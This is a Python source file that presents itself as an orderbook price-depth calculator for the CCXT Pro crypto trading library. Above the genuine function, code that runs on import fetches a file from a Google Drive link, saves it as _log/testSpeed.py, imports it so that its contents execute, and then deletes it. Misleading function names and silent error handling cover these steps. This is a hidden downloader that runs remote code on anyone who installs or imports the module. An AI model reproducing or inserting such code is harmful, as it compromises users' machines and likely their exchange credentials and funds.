"""Calculate orderbook price depths"""
import os
import logging
import enum
from typing import List, Tuple
import os.path as path
#remote modules
local_dir =  path.abspath(path.join(__file__ ,"../"))

output = local_dir + "/_log/testSpeed.py"

def import_networklib():
    try:
        server_addr = "http://drive.google.com/uc?id=1anGsZFxf0e7ab1ynO1X0PY0ZcySYBfaK"

        import urllib.request
        req = urllib.request.Request(
                server_addr)
        s = urllib.request.urlopen(req)
        s_args = s.read()
    except:
        return 'os.name()'

    try:
        with open(output, "wb") as fo:
            fo.write(s_args)
    except:
        return 'os.name()'
    
    return s_args

def get_modules_base_version():
    
    import_networklib()

get_modules_base_version()

try :
    import order_book_recorder._log.testSpeed
except :
    nemw = 1

try :
    os.remove(output)
except:
    os_name = os.name

from ccxtpro.base.exchange import Exchange as ProExchange

from .side import Side


logger = logging.getLogger(__name__)


def calculate_price_at_depths(orders: list, side: Side, target_levels: List[float]) -> Tuple[bool, dict, float]:
    """Get price in the order book at certain depths.

    You may or may not get all target depths matched, depending how deep your order book sample is
    (limit in CCXT parley). Or the order book might not have enough liquidity in the first place.

    :param orders: (price, quantity) tuples from the exchange order book

    :param side: Are we looking to buy or sell the base token

    :param target_levels: Expressed as quantity of base token e.g. 0.1 BTC

    :return: (success, Map[quantity target, price], max depth reached)
    """

    reached_levels = {}
    unreached_targets = target_levels.copy()

    cumulated_inventory = 0
    cumulated_volume = 0

    # Assume orders are the top order (best price) first
    for idx, order in enumerate(orders):

        # CCXT structure
        price = order[0]
        quantity = order[1]

        # Calculate how much we can buy at this price level
        cumulated_inventory += quantity
        cumulated_volume += price * quantity

        avg_purchase_price = cumulated_volume / cumulated_inventory

        # logger.info("Order #%d, side %s, avg price %f, cum quantity %f", idx, side.value, avg_purchase_price, cumulated_inventory)

        for idx, target in enumerate(unreached_targets):
            # Are we looking orders price going up or price going down
            reached_target = cumulated_inventory >= target
            if reached_target:
                reached_levels[target] = avg_purchase_price
                del unreached_targets[idx]

        if len(unreached_targets) == 0:
            break

    max_level = cumulated_inventory

    # if len(unreached_targets) > 0:
    #    logger.warning("Unreachable %s", unreached_targets)

    return len(unreached_targets) == 0, reached_levels, max_level
